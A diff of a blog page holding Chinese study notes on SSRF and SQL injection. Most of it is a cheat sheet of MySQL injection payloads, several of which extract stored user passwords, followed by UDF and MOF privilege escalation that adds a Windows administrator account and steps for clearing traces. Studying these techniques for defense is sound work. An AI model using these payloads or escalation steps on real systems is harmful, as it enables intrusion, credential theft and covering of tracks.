+<p>mailto：<strong>mailto</strong>是电子邮件地址的统一资源标识符(URI) 方案。它用于在网站上生成超链接，允许用户直接从HTML文档向特定地址发送电子邮件，而无需将其复制并输入电子邮件客户端。</p>
+<p>jar：Jar包中资源文件的路径表示</p>
+<p>netdoc:&#x2F;&#x2F;协议：在大部分情况下可代替file</p>
+<h3 id="文件读取-上传"><a href="#文件读取-上传" class="headerlink" title="文件读取,上传"></a>文件读取,上传</h3><p>读取：file:&#x2F;&#x2F;&#x2F;+绝对地址</p>
+<p>上传：gopher:&#x2F;&#x2F;+目标地址&#x2F;+处理后的上传文件数据包</p>
+<h3 id="内网探测与攻击："><a href="#内网探测与攻击：" class="headerlink" title="内网探测与攻击："></a><strong>内网探测与攻击：</strong></h3><p>端口扫描：利用bp</p>
+<p>后台登录：绕过限制登录</p>
+<p>FastCGI协议攻击</p>
+<p>Redis协议攻击</p>
+<h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a><strong>DOS攻击</strong></h3><p>内网服务器带宽通常较小，通过ssrf漏洞向内网服务器发送大量请求较易使其瘫痪</p>
+<h2 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h2><p>使用替代 IP 表示127.0.0.1，例如2130706433、017700000001或127.1</p>
+<p>Url编码</p>
+<p>大小写变体混淆ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</p>
+<p>短网址绕过</p>
+<p>重定向跳转</p>
+<p>#，@绕过</p>
+<p>特殊网址xip.io，nip.io，sslip.io</p>
+<p>添加端口号</p>
+<p>DNS解析</p>
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>过滤返回信息</p>
+<p>禁用不需要的协议</p>
+<p>限制请求端口和内网ip</p>
+<p>设置黑白名单</p>
+<p>统一返回的错误信息</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/一，ssrf漏洞/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/三，sql漏洞/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="chakSQl注入"><a href="#chakSQl注入" class="headerlink" title="chakSQl注入"></a>chakSQl注入</h1><p>概念：</p>
+<p>SQL是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。SQL注入就是由于程序员的疏忽对我们的输入检测不到位导致我们可以在输入中插入命令从而实现无登录的数据库查询</p>
+<p>常见的数据库：</p>
+<p>关系数据库：mysql,sqlite,oracle,sqlserver(mssql),Postgre SQL</p>
+<p>非关系数据库：mongodeb,redis</p>
+<p><strong>关系型数据库与非关系型数据库区别</strong>：</p>
+<p>关系型数据库：依据关系模型创建数据，表现为二维表格</p>
+<p>​		易于维护，使用方便，读写性能差，灵活度欠佳</p>
+<p>非关系数据库：不是关系数据库的统称。有多种表现形式如文档，键值，列</p>
+<p>​			格式灵活，速度快，高扩展性</p>
+<p>不同的数据库由于语法，函数的差异，以及前端语法的不同，在利用时方法会有些许不同</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>有可控参数，并且这个参数如果是从数据库获取数据，那么这个地方可能存在sql注入</p>
+<p>最经典的应该是登录界面了</p>
+<h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>1.wappalyzer指纹识别</p>
+<p>2.报错返回信息</p>
+<p>3.特殊的命令字符</p>
+<p>​		null”和“%00”是Access支持的注释。<br>​		#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* <em>&#x2F;注释<br>​		“–”和&#x2F;</em> *&#x2F;是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。<br>​		“;”是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。</p>
+<p>4.数据报报头</p>
+<p>5.数据库特有的表</p>
+<p>​		SQLServer数据库特有的表是：<strong>sysobjects</strong> ，所以可以用它来判断是否是SQLServer数据库</p>
+<p><code>exists(select*from sysobjects)  </code>  </p>
+<p>6.常见端口，组合</p>
+<p>​	  Oracle 1521</p>
+<pre><code>  SQL Server 1433
+</code></pre>
+<p>​	  Mysql 3306</p>
+<p>​	Asp+.net : sqlserver</p>
+<p>​	Php : Mysql+postgresql</p>
+<p>​	java:mysql+oracle</p>
+<p>​	iis:sqlserver</p>
+<p>​	apache:mysql+postgresql</p>
+<p>我们单以mysql为例</p>
+<p>我们判断是否存在sql注入的的基本思路就是猜测查询语法，尝试闭合查询语句，观察查询结果。如果尝试闭合后得到了理想的结果，基本确定该处是sql注入</p>
+<h2 id="mysql利用"><a href="#mysql利用" class="headerlink" title="mysql利用"></a>mysql利用</h2><p>注意：在确定漏洞后务必明确使用的数据库以及前后端环境，这对后面的sql注入利用至关重要！！！</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><code>UNION</code>可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</p>
+<p><code>UNION ALL</code>功能相同，但是会显示所有数据，不会去重。</p>
+<p><strong>在确定注入类型，闭合情况后，第一步要确定的是列数：</strong></p>
+<p>eg：1’ order by 3#	逐步增大直到报错</p>
+<p>或1’ union select 1,2,3#	逐步添加直到报错</p>
+<p><strong>然后确定回显位置</strong></p>
+<p>eg：-1’ union select 1,2,3#	</p>
+<p>ps：若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。<br>⼀定要拼接够足够的字段数，否则SQL语句报错</p>
+<p><strong>确定回显位置后就可以替换上sql语句查询数据库内容了</strong></p>
+<p>爆库-&gt;爆表-&gt;爆字段-&gt;爆数据</p>
+<pre><code>1&#39; union select 1,database(),3#  //返回相应数据库
+
+#获取数据空中的表
+1’ union select group_concat(table_name) form information_shema.tables where table_schema=database(),2,3#
+#获取表中的字段名
+1&#39; union select 1,group_concat(column_name) from information_schema.column where table_name=&#39;表名&#39;,3#
+#获取字符串
+1&#39; or 1=1 union select group_concat(字段1,字段2,字段3,……) from 表名
+PS:注意长度限制，默认是1024字节
+解决办法:
+1&#39; or 1=1 union select group_concat(字段1,字段2),group_count(字段3) from 表名
+</code></pre>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入思路是利用报错的回显，让其在报错的同时执行我们的注入语句</p>
+<p><strong>报错的过程可能会出现在查询或者插入甚至删除的过程中。</strong></p>
+<p>报错型注入则是利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果</p>
+<h4 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h4><p>concat()函数：将括号里的内容拼接</p>
+<p>rand()函数：根据种子生成数，如果留空会生成[0,1)的随机数，否则生成的数是固定的</p>
+<p>floor()函数：向下取整</p>
+<p>count()函数:统计行数</p>
+<p>group by：分组去重</p>
+<p>双查询注入样例：</p>
+<pre><code class="mysql">select floor(rand(14)*2) c, count(*) from information_schema.columns group by c
+</code></pre>
+<p> SQL语句中用列c分组，而列c是floor(rand(14)2)的别名</p>
+<p>floor(rand(14)*2)生成的数列为1，0，1，0</p>
+<p>在查询时，数据库会建立一个临时表，并设置unique约束的group_key和tally两个字段，查询时，如果group_key不在表中，就将其加入表中，如果存在，tally加一</p>
+<p>创建好临时表后，Mysql开始逐行扫描information_schema.columns表，遇到的第一个分组列是floor(rand(14)*2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)*2)，注意此时又计算了一次，结果为0。所以实际插入到临时表的一行group_key为0，tally为1。</p>
+<p>查询下一个分组列，还是floor(rand(14)*2)，这次计算结果为1，表中group_key没有，就会被添加。而添加时tally为0，group_key填入floor(rand(14)*2)时又被计算为0，而group_key为0的行已存在，由于其设置了不可重复约束，就会出现报错</p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>对xml查询函数</p>
+<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
+<pre><code class="mysql">and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))
+</code></pre>
+<p>ps： extractvalue() 能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用 substring() 函数截取。</p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml;"></a>updatexml;</h4><ul>
+<li>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc</li>
+<li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li>
+<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li>
+</ul>
+<p>作用：改变文档中符合条件的节点的值</p>
+<p>由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。</p>
+<pre><code class="mysql">&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+</code></pre>
+<p>ps：updatexml 能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用 substring() 函数截取。</p>
+<h4 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h4><p>返回 e 的 x 次方,当 数据过大 溢出时报错</p>
+<pre><code class="mysql">mail=&#39;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e))) as asd))--+
+</code></pre>
+<p>ps:5.5&lt;mysql版本&lt;5.6</p>
+<h4 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h4><pre><code>and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)
+</code></pre>
+<p>ps:查询内容为定值</p>
+<h4 id="geometrycollection-mysql-版本5-5-5-6"><a href="#geometrycollection-mysql-版本5-5-5-6" class="headerlink" title="geometrycollection() mysql 版本5.5-5.6"></a>geometrycollection() mysql 版本5.5-5.6</h4><p>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）</p>
+<p>报错：因为MYSQL无法使用这样的字符串画出图形，所以报错</p>
+<pre><code class="mysql">1&#39;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#39;manage&#39; limit 0,1)a)b)); %23
+</code></pre>
+<h4 id="multipoint-mysql-版本5-5"><a href="#multipoint-mysql-版本5-5" class="headerlink" title="multipoint() mysql 版本5.5"></a>multipoint() mysql 版本5.5</h4><p>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序</p>
+<p>报错：同样是因为无法使用字符串画出图形与geometrycollection类似</p>
+<pre><code class="mysql">1&#39;) and multipoint((select * from(select * from(select version())a)b)); %23
+</code></pre>
+<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><pre><code class="mysql">&#39;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage))asd)asd))--+
+</code></pre>
+<h4 id="mutipolygon"><a href="#mutipolygon" class="headerlink" title="mutipolygon()"></a>mutipolygon()</h4><pre><code class="mysql">&#39;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage))asd)asd))
+</code></pre>
+<h4 id="multlinestring"><a href="#multlinestring" class="headerlink" title="multlinestring ()"></a>multlinestring ()</h4><pre><code>and multlinestring((select * from (操作代码)a)b))
+</code></pre>
+<h4 id="linestring-）"><a href="#linestring-）" class="headerlink" title="linestring(）"></a>linestring(）</h4><p>报错：mysql的有些几何函数（ 例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)</p>
+<pre><code class="mysql">1&#39;) and linestring((select * from(select * from(select database())a)b))--+;
+</code></pre>
+<h4 id="ST-LatFromGeoHash-或-ST-LongFromGeoHash（mysql-gt-x3D-5-7-x）"><a href="#ST-LatFromGeoHash-或-ST-LongFromGeoHash（mysql-gt-x3D-5-7-x）" class="headerlink" title="ST.LatFromGeoHash()或 ST.LongFromGeoHash（mysql&gt;&#x3D;5.7.x）"></a>ST.LatFromGeoHash()或 ST.LongFromGeoHash（mysql&gt;&#x3D;5.7.x）</h4><pre><code class="mysql">&#39;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e))))a)b))--+
+</code></pre>
+<h4 id="GTID-MySQL-gt-x3D-5-6-X-显错-lt-x3D-200"><a href="#GTID-MySQL-gt-x3D-5-6-X-显错-lt-x3D-200" class="headerlink" title="GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)"></a>GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)</h4><pre><code class="mysql">&#39;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e),1)--+
+</code></pre>
+<pre><code class="mysql">&#39;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e),1)--+
+</code></pre>
+<h4 id="使用-join-using-报错获取列名"><a href="#使用-join-using-报错获取列名" class="headerlink" title="使用 join using() 报错获取列名"></a>使用 join using() 报错获取列名</h4><p>通过关键字join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因（相同列名存在），而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
+<pre><code class="mysql">1&#39; union all select * from (select * from users as a join users b using(id,username,password))c#
+</code></pre>
+<p>ps：在知道数据库跟表名的情况下使用才可以爆字段</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>与一般注入不同，布尔盲注只能通过页面状况得到真假判断而不知结果</p>
+<p>substr()：截取字符函数</p>
+<p>ASCII()：转换为ascii码</p>
+<p>&gt;&lt;&#x3D;^：判断符号</p>
+<p>首先通过页面对于永真条件<code>or 1=1</code> 与永假条件 <code>and 1=2</code> 的返回内容是否存在差异进行判断是否可以进行布尔盲注。</p>
+<p>eg：</p>
+<pre><code class="mysql">?id=0&#39;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+
+</code></pre>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>有的界面甚至无法根据页面判断真假，这时我们可以添加时间延迟作为判断依据</p>
+<p>eg：</p>
+<pre><code class="mysql">admin&#39; and if(ascii(substr((select database()),1,1))&gt;1,sleep(3),0)#
+</code></pre>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>使用；标志一条sql语句结束。与联合注入类似可以执行多个语句，不同的是除了查询语句以外还可以执行修改等命令。不过堆叠注入受环境限制较大。</p>
+<p>一般存在堆叠注入的都是由于使用 <code>mysqli_multi_query()</code> 函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。</p>
+<p>show：查看</p>
+<p>rename：修改表名</p>
+<p>alter、rename：修改表名和字段名</p>
+<p> HANDLER 语句</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>我们控制自己想要查询的语句插入到数据库中再去找一个<strong>能显示插入数据的回显的地方</strong>（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~）</p>
+<p>这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，<code>&#39;database()&#39;</code>会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了<code>&#39;0&#39;+database()+&#39;0&#39;</code>这样的构造，但是这个的回显是<code>0</code>，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的<code>&#39;0&#39;+hex(database())+&#39;0&#39;</code></p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交</p>
+<h3 id="8-0新特性"><a href="#8-0新特性" class="headerlink" title="8.0新特性"></a>8.0新特性</h3><h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。<br>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。</p>
+<p>形成一个新的列表，从表中读取数据</p>
+<p>table 123 from xxx；</p>
+<p><strong>与SELECT的区别</strong>：</p>
+<blockquote>
+<p>1.TABLE始终显示表的所有列<br>2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句</p>
+</blockquote>
+<h4 id="VALUES"><a href="#VALUES" class="headerlink" title="VALUES"></a>VALUES</h4><p>列出一行的值</p>
+<p>VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。</p>
+<p>;INSERT INTO users (id,username,passwd) VALUES (1,’admin’,’admin’); –+</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><pre><code>、#    %23    --+或-- -    ;%00
+</code></pre>
+<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>大小写，双写，字符串拼接</p>
+<h4 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h4><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!内容*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
+<h4 id="and，or-xor-not"><a href="#and，or-xor-not" class="headerlink" title="and，or,xor,not"></a>and，or,xor,not</h4><p>管道符：</p>
+<pre><code>and =&gt; &amp;&amp;
+or =&gt; ||
+xor = |
+not = !
+</code></pre>
+<p>异或盲注</p>
+<pre><code>异或运算规则:
+1^1=0 0^0=0 0^1=1
+1^1^1=0 1^1^0=0
+构造payload:&#39;^ascii(mid(database(),1,1)=98)^0
+</code></pre>
+<h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><pre><code># 使用注释符/**/代替空格:
+select/**/database();
+
+# 使用加号+代替空格:(只适用于GET方法中)
+select+database();
+# 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)
+
+# 使⽤括号嵌套:
+select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());
+
+# 使⽤其他不可⻅字符代替空格:
+%09, %0a, %0b, %0c, %0d, %a0
+
+#利用``分隔进行绕过
+select host,user from user where user=&#39;a&#39;union(select`table_name`,`table_type`from`information_schema`.`tables`);
+</code></pre>
+<p>同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。</p>
+<h4 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h4><p>order by盲注</p>
+<h4 id="比较符号（-x3D-、-lt-、-gt-）"><a href="#比较符号（-x3D-、-lt-、-gt-）" class="headerlink" title="比较符号（&#x3D;、&lt;、&gt;）"></a>比较符号（&#x3D;、&lt;、&gt;）</h4><h5 id="in（）"><a href="#in（）" class="headerlink" title="in（）"></a>in（）</h5><pre><code>/?id=&#39; or ascii(substr((select database()),1,1)) in(114)--+    // 错误
+/?id=&#39; or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显
+</code></pre>
+<h5 id="LIKE-注入"><a href="#LIKE-注入" class="headerlink" title="LIKE 注入"></a>LIKE 注入</h5><p>在LIKE子句中，百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线 <code>_</code> 通配符允许匹配任何单个字符。匹配成功则返回1，反之返回0，可用于sql盲注。</p>
+<ol>
+<li>判断数据库长度</li>
+</ol>
+<p>可用length()函数，也可用<code>_</code>，如：</p>
+<pre><code class="2">/?id=&#39; or database() like &#39;________&#39;--+  // 回显正常
+</code></pre>
+<p>2.判断数据库名</p>
+<pre><code>/?id=&#39; or database() like &#39;s%&#39; --+
+/?id=&#39; or (select database()) like &#39;s%&#39; --+
+或者:
+/?id=&#39; or database() like &#39;s_______&#39; --+
+/?id=&#39; or (select database()) like &#39;s_______&#39; --+
+</code></pre>
+<h5 id="REGEXP-注入"><a href="#REGEXP-注入" class="headerlink" title="REGEXP 注入"></a>REGEXP 注入</h5><p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配</p>
+<ol>
+<li>判断数据库长度</li>
+</ol>
+<pre><code>/?id=&#39; or (length(database())) regexp 8 --+  // 回显正常
+</code></pre>
+<ol>
+<li>判断数据库名</li>
+</ol>
+<pre><code>/?id=&#39; or database() regexp &#39;^s&#39;--+    // 回显正常
+/?id=&#39; or database() regexp &#39;se&#39;--+    // 回显正常, 不适用^和$进行匹配也可以
+/?id=&#39; or database() regexp &#39;^sa&#39;--+   // 报错
+/?id=&#39; or database() regexp &#39;y$&#39;--+    // 回显正常
+</code></pre>
+<p>&lt;&gt; 等价于 !&#x3D;，所以在前面再加一个!结果就是等号了</p>
+<h5 id="函数代替比较："><a href="#函数代替比较：" class="headerlink" title="函数代替比较："></a>函数代替比较：</h5><p>greatest(n1, n2, n3…):返回n中的最大值<br>least(n1,n2,n3…):返回n中的最小值<br>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1<br>between a and b:范围在a-b之间</p>
+<h4 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h4><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>magic_quotes_gpc （魔术引号开关）</p>
+<p><code>magic_quotes_gpc</code>函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
+<p>addslashes()函数</p>
+<p>返回在预定义字符之前添加反斜杠的字符串</p>
+<blockquote>
+<p>预定义字符：单引号（’），双引号（”），反斜杠（\），NULL</p>
+</blockquote>
+<h6 id="宽字节概念："><a href="#宽字节概念：" class="headerlink" title="宽字节概念："></a>宽字节概念：</h6><ol>
+<li>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)</li>
+<li>多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</li>
+<li>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</li>
+<li>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</li>
+<li>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字</li>
+</ol>
+<p><strong>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</strong></p>
+<p>例如说MySql的编码设置为了SET NAMES ‘gbk’或是 SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
+<p>比如我们输入1’</p>
+<p>处理后的sql执行语句为：</p>
+<pre><code>SELECT * FROM users WHERE id=&#39;1\&#39;&#39; LIMIT 0,1
+</code></pre>
+<p>被加了\转义</p>
+<p>由于\的GBK编码是%5c，‘運’字是%df%5c</p>
+<p>所以如果输入%df’就能吃到添加的反斜杠，转义失败</p>
+<h4 id="使用反斜杠-逃逸-Sql-语句"><a href="#使用反斜杠-逃逸-Sql-语句" class="headerlink" title="使用反斜杠 \ 逃逸 Sql 语句"></a>使用反斜杠 \ 逃逸 Sql 语句</h4><p>eg：</p>
+<pre><code>select username,password from users where username=&#39;admin\&#39; and password=&#39; or 1#&#39;
+</code></pre>
+<p>这样or 1逃逸出来，由此可控，可作为注入点</p>
+<h4 id="堆叠注入mysql预处理"><a href="#堆叠注入mysql预处理" class="headerlink" title="堆叠注入mysql预处理"></a>堆叠注入mysql预处理</h4><ol>
+<li>PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(<code>hello</code>)供之后调用</li>
+<li>EXECUTE：执行命令</li>
+<li>DEALLOCATE PREPARE：释放命令</li>
+<li>SET：用于设置变量(<code>@a</code>)</li>
+</ol>
+<pre><code class="mysql">1&#39;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#
+</code></pre>
+<h4 id="十六进制绕过关键词"><a href="#十六进制绕过关键词" class="headerlink" title="十六进制绕过关键词"></a>十六进制绕过关键词</h4><p>0x73686F7720646174616261736573&#x3D;show database</p>
+<pre><code>1&#39;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#
+</code></pre>
+<h4 id="ascii编码绕过"><a href="#ascii编码绕过" class="headerlink" title="ascii编码绕过"></a>ascii编码绕过</h4><pre><code>select * from users where username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110);
+</code></pre>
+<p>mysql7之后不能用</p>
+<h4 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h4><h5 id="from…for…绕过"><a href="#from…for…绕过" class="headerlink" title="from…for…绕过"></a>from…for…绕过</h5><pre><code>select substr((select database()),1,1);
+select substr((select database()) from 1 for 1);
+</code></pre>
+<h5 id="offset绕过"><a href="#offset绕过" class="headerlink" title="offset绕过"></a>offset绕过</h5><pre><code>select * from users limit 1 offset 2;
+# 此时 limit 1 offset 2 可以代替 limit 1,2
+</code></pre>
+<h5 id="join与别名绕过"><a href="#join与别名绕过" class="headerlink" title="join与别名绕过"></a>join与别名绕过</h5><pre><code>select host,user from user where user=&#39;a&#39;union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`=&#39;mysql&#39;)`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`=&#39;mysql&#39;)b));
+</code></pre>
+<h4 id="information-schema绕过与无列名注入"><a href="#information-schema绕过与无列名注入" class="headerlink" title="information_schema绕过与无列名注入"></a>information_schema绕过与无列名注入</h4><h4 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h4><pre><code>sleep() --&gt;benchmark()   benchmark(100000000,rand()),1)  +waitfor delay+&#39;0:0:5&#39;                                  utl_http.request(&#39;http://10.0.0.1&#39;)   HTTPURITYPE(&#39;http://10.0.0.1&#39;).getclob()   
+     decode(substr(user,1,1),&#39;A&#39;,(select count(*) from all_objects,all_objects,all_objects,all_objects),0)
+ascii()–&gt;hex()、bin()
+group_concat()–&gt;concat_ws()
+substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()
+user() --&gt; @@user
+datadir–&gt;@@datadir
+ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致
+
+</code></pre>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h4><p>udf &#x3D; ‘user defined function‘，即‘用户自定义函数’。文件后缀为‘.dll’，常用c语言编写。</p>
+<p>通过在udf文件中定义新函数，对MYSQL的功能进行扩充，可以执行系统任意命令。将MYSQL账号root转化为系统system权限。</p>
+<p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<pre><code>#从udf文件中引入自定义函数
+create function sys_eval returns string soname &#39;udf.dll&#39;; 
+//sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名
+
+#执行自定义函数
+新建账号waitalone，密码为waitalone.cn
+select cmdshell(&#39;net user waitalone waitalone.cn /add&#39;); 
+将waitalone加入管理员组
+select cmdshell(&#39;net localgroup administrators waitalone /add&#39;);
+
+#清除痕迹
+drop function cmdshell;     #删除函数
+delete from mysql.func where name=&#39;cmdshell&#39;  #删除函数
+</code></pre>
+<h4 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h4><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<p>传入：</p>
+<p>select 编码文件 into dumpfile “C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof”;<br>清理痕迹：</p>
+<pre><code class="bash"># 停止 winmgmt 服务
+net stop winmgmt
+
+# 删除 Repository 文件夹
